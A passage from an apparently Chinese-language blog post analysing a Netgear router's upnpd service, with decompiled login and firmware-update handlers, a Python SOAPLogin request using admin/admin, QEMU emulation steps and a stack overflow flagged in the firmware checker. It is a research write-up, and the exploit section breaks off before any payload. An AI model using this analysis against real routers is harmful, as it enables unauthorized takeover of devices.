class=\"token operator\">*</span><span class=\"token punctuation\">)</span>int_addr_v6<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> v36 <span class=\"token operator\">&gt;</span> <span class=\"token number\">1</span> <span class=\"token punctuation\">)</span>\n  <span class=\"token punctuation\">{</span>\n    resp_state <span class=\"token operator\">=</span> v36<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">return</span> <span class=\"token function\">respond</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x20000</span><span class=\"token punctuation\">,</span> XMLBODY<span class=\"token punctuation\">,</span> int_fd_v5<span class=\"token punctuation\">,</span> resp_state<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>在<code>processAction</code>函数中主要通过一个<strong>switch case来调用不同action</strong>，在<code>isNameiMatch(const char *keySrc, int key_idx)</code>中根据kei_idx在action列表查对应action名(同样)，然后在对比keySrc(即http data)中是否指定了该action，如果是返回1。</p>\n<pre class=\"line-numbers language-c\" data-language=\"c\"><code class=\"language-c\">serverIdx_v6 <span class=\"token operator\">=</span> serverIdx<span class=\"token punctuation\">;</span>\nhttp_v7 <span class=\"token operator\">=</span> http<span class=\"token punctuation\">;</span>\nflag_a1 <span class=\"token operator\">=</span> ifssl<span class=\"token punctuation\">;</span>\nfd <span class=\"token operator\">=</span> int_fd<span class=\"token punctuation\">;</span>\nin_addr_v8 <span class=\"token operator\">=</span> in_addr<span class=\"token punctuation\">;</span>\n<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%s():type=%d\\n\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"sa_processResponse\"</span><span class=\"token punctuation\">,</span> serverIdx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">switch</span> <span class=\"token punctuation\">(</span> serverIdx_v6 <span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">case</span> <span class=\"token number\">0</span><span class=\"token operator\">:</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> <span class=\"token function\">isNameiMatch</span><span class=\"token punctuation\">(</span>http_v7<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token number\">1</span> <span class=\"token punctuation\">)</span>\n            <span class=\"token keyword\">goto</span> LABEL_251<span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> <span class=\"token function\">isNameiMatch</span><span class=\"token punctuation\">(</span>http_v7<span class=\"token punctuation\">,</span> <span class=\"token number\">19</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token number\">1</span> <span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">{</span>\n            key_idx <span class=\"token operator\">=</span> <span class=\"token number\">19</span><span class=\"token punctuation\">;</span>\n            flag_v12 <span class=\"token operator\">=</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">goto</span> LABEL_252<span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span>\n        <span class=\"token punctuation\">{</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token comment\">/*\n.data:00083B88 ; specialAction ActionList[400]\n.data:00083B88 ActionList      DCD 0, 0x49BB8, 1, 0x47F68, 2, 0x49BC0, 3, 0x49BD4, 4\n.data:00083B88                                         ; DATA XREF: GotName:loc_2A91C↑o\n.data:00083B88                                         ; .text:off_2A960↑o\n.data:00083B88                 DCD 0x48578, 5, 0x49BE8, 6, 0x49BFC, 7, 0x49C10, 8, 0x49C18\n.data:00083B88                 DCD 9, 0x49C24, 0xA, 0x49C30, 0xB, 0x49C3C, 0xC, 0x49C4C\n.data:00083B88                 DCD 0x9B, 0x49C60, 0xD, 0x49C78, 0xE, 0x49C88, 0xF, 0x49C9C\n.data:00083B88                 DCD 0x10, 0x49CA8, 0x11, 0x49CB8, 0x12, 0x49CC8, 0x13\n.data:00083B88                 DCD 0x49CD8, 0x14, 0x49CF4, 0x15, 0x49D0C, 0x16, 0x49BB8\n.data:00083B88                 DCD 0x17, 0x49BB8, 0x18, 0x49BB8, 0x19, 0x49BB8, 0x1A\n.data:00083B88                 DCD 0x49D24, 0x1B, 0x49D34, 0x1C, 0x49D44, 0x1D, 0x49D58\n.data:00083B88                 DCD 0x1E, 0x49D68, 0x1F, 0x49D7C, 0x20, 0x49D8C, 0x21\n.data:00083B88                 DCD 0x49D9C, 0x22, 0x49DB0, 0x23, 0x49DC4, 0x24, 0x49DD8\n.data:00083B88                 DCD 0x25, 0x49DF0, 0x26, 0x49E0C, 0x27, 0x49E14, 0x28\n.data:00083B88                 DCD 0x49E28, 0x29, 0x49E34, 0x2A, 0x48250, 0x2B, 0x49E40\n.data:00083B88                 DCD 0x2C, 0x49E54, 0x2D, 0x49E6C, 0x2E, 0x49E80, 0x2F\n*/</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>upnp的login action名为<code>SOAPLogin</code>，属于DeviceConfig服务，action下标为197：</p>\n<pre class=\"line-numbers language-c\" data-language=\"c\"><code class=\"language-c\"><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> key_idx <span class=\"token operator\">!=</span> <span class=\"token number\">197</span> <span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">goto</span> LABEL_264<span class=\"token punctuation\">;</span>\nv54 <span class=\"token operator\">=</span> <span class=\"token function\">stristr</span><span class=\"token punctuation\">(</span>http_v7<span class=\"token punctuation\">,</span> <span class=\"token string\">\"&lt;Username\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// login check</span>\nv55 <span class=\"token operator\">=</span> v54<span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> v54 <span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">{</span>\n    v55 <span class=\"token operator\">=</span> <span class=\"token function\">stristr</span><span class=\"token punctuation\">(</span>v54<span class=\"token punctuation\">,</span> <span class=\"token string\">\"&gt;\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> v55 <span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">{</span>\n        v56 <span class=\"token operator\">=</span> <span class=\"token function\">stristr</span><span class=\"token punctuation\">(</span>http_v7<span class=\"token punctuation\">,</span> <span class=\"token string\">\"&lt;/Username&gt;\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> v56 <span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">{</span>\n            <span class=\"token operator\">*</span>v56 <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n            v57 <span class=\"token operator\">=</span> v56<span class=\"token punctuation\">;</span>\n            v55 <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token function\">acosNvramConfig_match</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"http_username\"</span><span class=\"token punctuation\">,</span> v55 <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// what is the original 'http_username' ?</span>\n            <span class=\"token operator\">*</span>v57 <span class=\"token operator\">=</span> <span class=\"token char\">'&lt;'</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span>\n        <span class=\"token keyword\">else</span>\n        <span class=\"token punctuation\">{</span>\n            v55 <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\nv58 <span class=\"token operator\">=</span> <span class=\"token function\">stristr</span><span class=\"token punctuation\">(</span>http_v7<span class=\"token punctuation\">,</span> <span class=\"token string\">\"&lt;Password\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> <span class=\"token operator\">!</span>v58 <span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">goto</span> LABEL_836<span class=\"token punctuation\">;</span>\na3 <span class=\"token operator\">=</span> <span class=\"token function\">stristr</span><span class=\"token punctuation\">(</span>v58<span class=\"token punctuation\">,</span> <span class=\"token string\">\"&gt;\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> <span class=\"token operator\">!</span>a3 <span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">goto</span> LABEL_836<span class=\"token punctuation\">;</span>\nv59 <span class=\"token operator\">=</span> <span class=\"token function\">stristr</span><span class=\"token punctuation\">(</span>http_v7<span class=\"token punctuation\">,</span> <span class=\"token string\">\"&lt;/Password&gt;\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> <span class=\"token operator\">!</span>v59 <span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">goto</span> LABEL_836<span class=\"token punctuation\">;</span>\n<span class=\"token operator\">*</span>v59 <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\nv77 <span class=\"token operator\">=</span> v59<span class=\"token punctuation\">;</span>\n<span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>_DWORD <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>v82 <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">memset</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>v83<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x7Cu</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">doHash</span><span class=\"token punctuation\">(</span>a3 <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> v82<span class=\"token punctuation\">,</span> a3<span class=\"token punctuation\">,</span> v60<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>       <span class=\"token comment\">// passwd stored in SHA256 format</span>\nv61 <span class=\"token operator\">=</span> <span class=\"token function\">acosNvramConfig_match</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"http_passwd_digest\"</span><span class=\"token punctuation\">,</span> v82<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\nv62 <span class=\"token operator\">=</span> v61 <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> v61 <span class=\"token punctuation\">)</span>\n    v62 <span class=\"token operator\">=</span> v55 <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n<span class=\"token operator\">*</span>v77 <span class=\"token operator\">=</span> <span class=\"token number\">60</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> <span class=\"token operator\">!</span>v62 <span class=\"token punctuation\">)</span>                         <span class=\"token comment\">// account right</span>\n<span class=\"token punctuation\">{</span>\n    <span class=\"token function\">sub_31CDC</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span>v99<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">in_addr_t</span><span class=\"token punctuation\">)</span>in_addr<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// generate cookie</span>\n    v63 <span class=\"token operator\">=</span> <span class=\"token function\">sub_32014</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">signed</span> <span class=\"token keyword\">int</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span>v99<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span><span class=\"token punctuation\">)</span>in_addr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> v63 <span class=\"token operator\">&lt;=</span> <span class=\"token number\">0</span> <span class=\"token punctuation\">)</span>\n        v63 <span class=\"token operator\">=</span> <span class=\"token number\">503</span><span class=\"token punctuation\">;</span>\n    resp_state <span class=\"token operator\">=</span> v63<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>需要在发送的http包中指定<code>&lt;Username&gt;Name&lt;/Username&gt;</code>，<code>&lt;Password&gt;Passwd&lt;/Password&gt;</code>，登录成功后将session_ID在响应包中发送。在模拟启动环境发送登录包将获得如下响应包：</p>\n<p><img src=\"https://cdn.staticaly.com/gh/L2ksy0d/image-host@master/20230418/image-20230313133704656.643pkn0mof80.webp\"></p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">def</span> <span class=\"token function\">SOAPLogin</span><span class=\"token punctuation\">(</span>http_username<span class=\"token punctuation\">:</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">,</span> passwd<span class=\"token punctuation\">:</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span><span class=\"token operator\">&gt;</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">:</span>\n    header <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token string\">\"SOAPACTION\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"urn:NETGEAR-ROUTER:service:DeviceConfig:1#SOAPLogin\"</span>\n    <span class=\"token punctuation\">}</span>\n    body <span class=\"token operator\">=</span> <span class=\"token string\">'&lt;?xml version=\"1.0\"?&gt;\\r\\n'</span>\n    body <span class=\"token operator\">+=</span> <span class=\"token string\">'&lt;Username&gt;admin&lt;/Username&gt;\\r\\n'</span>\n    body <span class=\"token operator\">+=</span> <span class=\"token string\">'&lt;Password&gt;admin&lt;/Password&gt;\\r\\n'</span>\n\n    respnd <span class=\"token operator\">=</span> requests<span class=\"token punctuation\">.</span>post<span class=\"token punctuation\">(</span>url<span class=\"token operator\">=</span>URL<span class=\"token punctuation\">,</span> headers<span class=\"token operator\">=</span>header<span class=\"token punctuation\">,</span> data<span class=\"token operator\">=</span>body<span class=\"token punctuation\">)</span>\n    cookie <span class=\"token operator\">=</span> respnd<span class=\"token punctuation\">.</span>headers<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span><span class=\"token string\">'Set-Cookie'</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>cookie<span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">return</span> cookie<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n\n\n\n\n<h2 id=\"模拟启动\"><a href=\"#模拟启动\" class=\"headerlink\" title=\"模拟启动\"></a>模拟启动</h2><p>qemu配置如下：<a href=\"https://people.debian.org/~aurel32/qemu/armhf/\">Index of /~aurel32/qemu/armhf (debian.org)</a></p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token shebang important\">#!/bin/bash</span>\n\nqemu-system-arm -M vexpress-a9 <span class=\"token punctuation\">\\</span>\n\t-kernel vmlinuz-3.2.0-4-vexpress <span class=\"token punctuation\">\\</span>\n\t-initrd initrd.img-3.2.0-4-vexpress <span class=\"token punctuation\">\\</span>\n\t-drive <span class=\"token assign-left variable\">if</span><span class=\"token operator\">=</span>sd,file<span class=\"token operator\">=</span>debian_wheezy_armhf_standard.qcow2<span class=\"token punctuation\">\\</span>\n\t-append <span class=\"token string\">\"root=/dev/mmcblk0p2 console=ttyAMA0\"</span> <span class=\"token punctuation\">\\</span>\n\t-net user,hostfwd<span class=\"token operator\">=</span>tcp::2222-:22,hostfwd<span class=\"token operator\">=</span>tcp::5555-:5555,hostfwd<span class=\"token operator\">=</span>tcp::5000-:5000 -net nic <span class=\"token punctuation\">\\</span>\n\t-nographic<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>因为程序中大量调用nvram的系列函数，所以使用<a href=\"https://github.com/grimm-co/NotQuite0DayFriday.git%E6%8F%90%E4%BE%9B%E7%9A%84hook%E6%BA%90%E7%A0%81%E7%BC%96%E8%AF%91%E4%B8%80%E4%B8%AAhook%E5%BA%93(%E6%A0%B9%E6%8D%AEIDA%E5%8F%AF%E7%9F%A5nvram%E5%87%BD%E6%95%B0%E7%9A%84%E5%AE%9E%E7%8E%B0%E5%9C%A8%60libnvram.so%60%E4%B8%AD)%EF%BC%8C%E7%84%B6%E5%90%8E%E4%BC%A0%E5%85%A5qemu%E4%B8%AD%E6%9B%BF%E6%8D%A2%60usr/lib/libnvram.so%60%E3%80%82%E5%B0%9D%E8%AF%95%E5%90%AF%E5%8A%A8%E7%BB%93%E6%9E%9C%E5%A6%82%E4%B8%8B\">https://github.com/grimm-co/NotQuite0DayFriday.git提供的hook源码编译一个hook库(根据IDA可知nvram函数的实现在`libnvram.so`中)，然后传入qemu中替换`usr/lib/libnvram.so`。尝试启动结果如下</a></p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">root@debian-armhf:~<span class=\"token comment\"># cd squashfs-root/</span>\nroot@debian-armhf:~/squashfs-root<span class=\"token comment\"># mount --bind /proc ./proc</span>\nroot@debian-armhf:~/squashfs-root<span class=\"token comment\"># mount --bind /dev ./dev/</span>\nroot@debian-armhf:~/squashfs-root<span class=\"token comment\"># chroot . ./bin/busybox sh</span>\n\n\nBusyBox v1.7.2 <span class=\"token punctuation\">(</span><span class=\"token number\">2021</span>-08-26 <span class=\"token number\">10</span>:32:44 CST<span class=\"token punctuation\">)</span> built-in shell <span class=\"token punctuation\">(</span>ash<span class=\"token punctuation\">)</span>\nEnter <span class=\"token string\">'help'</span> <span class=\"token keyword\">for</span> a list of built-in commands.\n\n<span class=\"token comment\">#/usr/sbin/upnpd</span>\nGetting upnp_turn_on\nGetting upnp_turn_on\nGetting lan_ipaddr\nGetting upnp_turn_on\nGetting upnp_turn_on\nGetting friendly_name\nGetting upnp_turn_on\nGetting friendly_name\nGetting upnp_turn_on\nGetting hw_rev\nGetting upnp_turn_on\nGetting friendly_name\nGetting upnp_turn_on\nGetting upnp_turn_on\nopen: No such <span class=\"token function\">file</span> or directory\nGetting upnp_turn_on\nGetting lan_hwaddr\nGetting lan_hwaddr\nGetting upnp_turn_on\nGetting lan_ipaddr\nGetting upnp_turn_on\nGetting friendly_name\nGetting upnp_turn_on\nGetting hw_rev\nGetting upnp_turn_on\nGetting friendly_name\nGetting upnp_turn_on\nGetting upnp_turn_on\nopen: No such <span class=\"token function\">file</span> or directory\nGetting upnp_turn_on\nGetting lan_hwaddr\nGetting lan_hwaddr\nGetting upnp_turn_on\nGetting lan_ipaddr\nGetting upnp_turn_on\nGetting friendly_name\nGetting upnp_turn_on\nGetting hw_rev\nGetting upnp_turn_on\nGetting friendly_name\nGetting upnp_turn_on\nGetting upnp_turn_on\nopen: No such <span class=\"token function\">file</span> or directory\nGetting upnp_turn_on\nGetting lan_hwaddr\nGetting lan_hwaddr\nGetting upnp_turn_on\nGetting lan_ipaddr\nGetting upnp_duration\nGetting upnp_duration\nGetting upnp_duration\nGetting upnp_duration\nGetting upnp_duration\nGetting upnp_duration\nGetting upnp_duration\nGetting upnp_duration\nSetting upnp_portmap_entry <span class=\"token operator\">=</span> <span class=\"token number\">0</span>\nGetting upnp_turn_on\nGetting lan_ipaddr\nGetting lan_ipaddr<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>程序在main函数中调用了<code>daemon</code>进入后台，所以不方便直接gdb调试，因此为了后面分析这里需要<code>NOP</code>掉；然后就是直接运行发现后面立马<code>exit(0)</code>。nop掉daemon后进去调试发现在调用<code>setsockopt(v5, 0, 35, &amp;optval, 8u)</code><strong>加入多播地址出错</strong>：</p>\n<p><img src=\"https://cdn.staticaly.com/gh/L2ksy0d/image-host@master/20230418/image-20230310110201657.1ezkyyc9sj4w.webp\"></p>\n<p>google了一下这个问题发现是qemu自身不支持多播协议：</p>\n<p><img src=\"https://cdn.staticaly.com/gh/L2ksy0d/image-host@master/20230418/image-20230310110347986.5xdhln13uts0.webp\"></p>\n<p>但是这里关键在于upnp程序的控制服务和多播功能关系不大，因此选择将修改下面的跳转为无条件跳转：</p>\n<p><img src=\"https://cdn.staticaly.com/gh/L2ksy0d/image-host@master/20230418/image-20230310110538896.by7epj96oyo.webp\"></p>\n<p>然后就可以维持运行了：</p>\n<p><img src=\"https://cdn.staticaly.com/gh/L2ksy0d/image-host@master/20230418/image-20230310110647617.44p7iyns4u00.webp\"></p>\n<p>需要的就是这两个端口</p>\n<h2 id=\"Exploit\"><a href=\"#Exploit\" class=\"headerlink\" title=\"Exploit\"></a>Exploit</h2><p>与login的action调用类似，固件更新的action名为<code>SetFirmware</code>，同样属于<code>DeviceConfig</code>服务下标为60，主要逻辑如下：</p>\n<pre class=\"line-numbers language-c\" data-language=\"c\"><code class=\"language-c\">  v130 <span class=\"token operator\">=</span> v7 <span class=\"token operator\">==</span> <span class=\"token number\">0xFF13</span><span class=\"token punctuation\">;</span>\n  dword_EC044<span class=\"token punctuation\">[</span><span class=\"token number\">19</span> <span class=\"token operator\">*</span> v83<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0xFF3B</span><span class=\"token punctuation\">;</span>\n  firmdataDecry <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x400000u</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  v24 <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> __int8 <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>firmdataDecry<span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> <span class=\"token operator\">!</span>firmdataDecry <span class=\"token punctuation\">)</span>\n  <span class=\"token punctuation\">{</span>\n    v2 <span class=\"token operator\">=</span> <span class=\"token number\">603</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"No memory buffer %d for using in %s\\n\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x400000</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"sa_setFirmware\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">goto</span> LABEL_101<span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">}</span>\n  <span class=\"token function\">base64Decode</span><span class=\"token punctuation\">(</span>firmdataDecry<span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>v130<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> __int8 <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>firmdataCry<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"sa_base64_decode, len=%d\\n\"</span><span class=\"token punctuation\">,</span> v130<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  v25 <span class=\"token operator\">=</span> v24<span class=\"token punctuation\">[</span><span class=\"token number\">7</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n  <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"SOAP firmware upgrade checking ... \"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> <span class=\"token function\">checker</span><span class=\"token punctuation\">(</span>v24<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span>                           <span class=\"token comment\">// stack overflow</span>\n  <span class=\"token punctuation\">{</span>\n    v2 <span class=\"token operator\">=</span> <span class=\"token number\">702</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">}</span>\n<span class=\"token comment\">/*checker part*/</span>\n    v4 <span class=\"token operator\">=</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> __int8 <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>v1 <span class=\"token operator\">+</span> <span class=\"token number\">38</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    v5 <span class=\"token operator\">=</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> __int8 <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>v1 <span class=\"token operator\">+</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    v6 <span class=\"token operator\">=</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> __int8 <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>v1 <span class=\"token operator\">+</span> <span class=\"token number\">37</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    v7 <span class=\"token operator\">=</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> __int8 <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>v1 <span class=\"token operator\">+</span> <span class=\"token number\">7</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> __int8 <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>v1 <span class=\"token operator\">+</span> <span class=\"token number\">4</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;&lt;</span> <span class=\"token number\">24</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> __int8 <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>v1 <span class=\"token operator\">+</span> <span class=\"token number\">6</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;&lt;</span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    v8 <span class=\"token operator\">=</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> __int8 <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>v1 <span class=\"token operator\">+</span> <span class=\"token number\">39</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> 